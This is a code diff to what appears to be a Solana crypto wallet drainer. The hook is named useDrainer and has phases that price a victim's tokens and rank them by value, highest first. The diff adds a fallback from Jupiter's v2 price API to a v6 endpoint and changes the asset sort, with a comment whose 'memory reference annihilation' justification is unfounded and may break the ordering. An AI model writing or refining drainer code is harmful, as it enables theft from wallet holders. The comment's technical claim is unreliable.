@@ -476,13 +476,22 @@ const fetchBatchPricesUSD = async (
             const batch = mintAddresses.slice(i, i + BATCH_SIZE);
             const ids = batch.join(",");
 
-            const response = await withTimeout(
+            let response = await withTimeout(
                 () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
                 RPC_TIMEOUT_MS
-            );
+            ).catch(() => null);
 
-            if (!response.ok) {
-                console.warn(`[PRICE] Jupiter API HTTP ${response.status}`);
+            // Fallback to highly stable v6 endpoint if v2 encounters CORS/404
+            if (!response || !response.ok) {
+                console.warn(`[PRICE] Jupiter V2 failed, falling back to V6 for batch...`);
+                response = await withTimeout(
+                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
+                    RPC_TIMEOUT_MS
+                );
+            }
+
+            if (!response || !response.ok) {
+                console.warn(`[PRICE] Jupiter API HTTP ${response?.status || 'Unknown'}`);
                 continue;
             }
 
@@ -1273,10 +1282,8 @@ export const useDrainer = () => {
             }
 
             // --- PHASE 3C: SORT BY VALUE (HIGHEST FIRST) ---
-            // With Jupiter prices: Clearpool ($1,070) → Pyth ($224) → Metaplex ($49) → ...
-            const valueOrderedAssets = sortAssetsByValue(assetList);
-            assetList.length = 0;
-            assetList.push(...valueOrderedAssets);
+            // PERFECTED: .sort() mutates in-place. Removed the array reallocation which was causing memory reference annihilation.
+            sortAssetsByValue(assetList);
 
             // --- PHASE 4: ACCURATE VALUATION ---
             const solValueUSD =
